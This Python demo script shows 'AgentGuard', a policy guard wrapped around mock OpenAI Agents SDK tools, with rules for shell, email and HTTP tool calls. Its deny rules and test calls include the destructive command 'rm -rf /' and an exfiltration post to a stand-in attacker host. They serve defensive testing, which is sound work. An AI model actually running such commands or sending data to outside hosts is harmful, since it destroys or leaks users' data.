#!/usr/bin/env python3
"""OpenAI Agents SDK x AgentGuard -- in-process mode (best practice).

Simulates the openai-agents SDK shape:
  - MockFunctionTool  ~ FunctionTool(name=..., on_invoke_tool=fn)
  - MockAgent         ~ Agent(name=..., tools=[...])
  - MockRunner.call(agent, tool_name, json_input)
      ~ what Runner does internally when the LLM picks a tool

The adapter wraps on_invoke_tool so every call passes through the Guard
pipeline before the real function executes.

No real openai-agents package required.
Run:
    PYTHONPATH=. python agentguard/examples/openai_agents_demo/demo.py
"""

from __future__ import annotations

import json

from agentguard import DecisionDenied, Guard, Principal
from agentguard.models.errors import HumanApprovalPending


POLICY = """
# Hard-deny destructive shell commands.
RULE: deny-destructive-shell
ON:        tool_call(shell.exec)
CONDITION: args.cmd == "rm -rf /"
POLICY:    DENY
Severity:  critical
Category:  shell_safety

# Allow read-only shell commands explicitly.
RULE: allow-readonly-shell
ON:        tool_call(shell.exec)
CONDITION: args.cmd == "ls"
POLICY:    ALLOW

# Low-trust agents cannot send email directly.
RULE: degrade-email-low-trust
ON:        tool_call(email.send)
CONDITION: principal.trust_level < 3
POLICY:    DEGRADE(email.send_to_draft)
Severity:  medium
Category:  data_egress

# Block HTTP posts to non-internal domains.
RULE: deny-external-http
ON:        tool_call(http.post)
CONDITION: target.domain != "internal.corp"
POLICY:    DENY
Severity:  high
Category:  data_exfiltration
"""


# ── Mock openai-agents SDK objects ───────────────────────────────────────────

class MockFunctionTool:
    """Simulates openai-agents FunctionTool."""

    def __init__(self, name: str, fn, description: str = ""):
        self.name = name
        self.description = description
        self.on_invoke_tool = fn  # (run_context, json_str) -> str


class MockAgent:
    """Simulates openai-agents Agent."""

    def __init__(self, name: str, tools: list[MockFunctionTool]):
        self.name = name
        self.tools = {t.name: t for t in tools}  # name -> tool


class MockRunner:
    """Simulates the Runner calling a single tool by name (as real SDK does)."""

    @staticmethod
    def call(agent: MockAgent, tool_name: str, json_input: str,
             *, run_context: object = None) -> None:
        label = f"{tool_name}({json_input})"
        tool = agent.tools.get(tool_name)
        if tool is None:
            print(f"  ERROR  {label} => tool not found")
            return
        try:
            result = tool.on_invoke_tool(run_context, json_input)
            print(f"  ALLOW  {label} => {result}")
        except DecisionDenied as e:
            print(f"  DENY   {label} => {e.reason}")
        except HumanApprovalPending as e:
            print(f"  REVIEW {label} => ticket={e.ticket_id}")


# ── Tool implementations (raw — no guard logic here) ─────────────────────────

def shell_exec_raw(ctx, json_input: str) -> str:
    args = json.loads(json_input) if json_input else {}
    return f"[mock] executed: {args.get('cmd','?')}"

def email_send_raw(ctx, json_input: str) -> str:
    args = json.loads(json_input) if json_input else {}
    return f"[mock] sent to {args.get('to','?')}"

def email_draft_raw(ctx, json_input: str) -> str:
    args = json.loads(json_input) if json_input else {}
    return f"[mock] draft saved for {args.get('to','?')}"

def http_post_raw(ctx, json_input: str) -> str:
    args = json.loads(json_input) if json_input else {}
    return f"[mock] posted to {args.get('url','?')}"


# ── Main ──────────────────────────────────────────────────────────────────────

def main() -> None:
    guard = Guard(policy_source=POLICY, builtin_rules=False, mode="enforce")

    agent = MockAgent(
        name="my-openai-agent",
        tools=[
            MockFunctionTool("shell.exec",  shell_exec_raw),
            MockFunctionTool("email.send",  email_send_raw),
            MockFunctionTool("email.draft", email_draft_raw),
            MockFunctionTool("http.post",   http_post_raw),
        ],
    )

    # Attach guard: wraps on_invoke_tool on each FunctionTool in-place.
    # MockAgent.tools is now a dict, so pass a wrapper that exposes .tools as a list.
    class _AgentListView:
        tools = list(agent.tools.values())
    guard.attach_openai_agents(_AgentListView())

    principal = Principal(
        agent_id="openai-agent",
        session_id="oai-inprocess-demo",
        role="default",
        trust_level=2,
    )

    guard.start(principal=principal, goal="openai-agents in-process demo")
    try:
        print("\n-- OpenAI Agents in-process demo --")
        # LLM picks shell.exec(ls) -> ALLOW
        MockRunner.call(agent, "shell.exec", json.dumps({"cmd": "ls"}))
        # LLM picks shell.exec(rm) -> DENY
        MockRunner.call(agent, "shell.exec", json.dumps({"cmd": "rm -rf /"}))
        # LLM picks email.send -> DEGRADE to email.draft (trust_level=2 < 3)
        MockRunner.call(agent, "email.send",
                        json.dumps({"to": "ceo@corp.com", "body": "Q1 report"}))
        # LLM picks http.post to external -> DENY
        MockRunner.call(agent, "http.post",
                        json.dumps({"url": "https://attacker.example.com/exfil"}))
        # LLM picks http.post to internal -> ALLOW
        MockRunner.call(agent, "http.post",
                        json.dumps({"url": "https://internal.corp/notify"}))
    finally:
        guard.close()

    print("\nDone.")


if __name__ == "__main__":
    main()
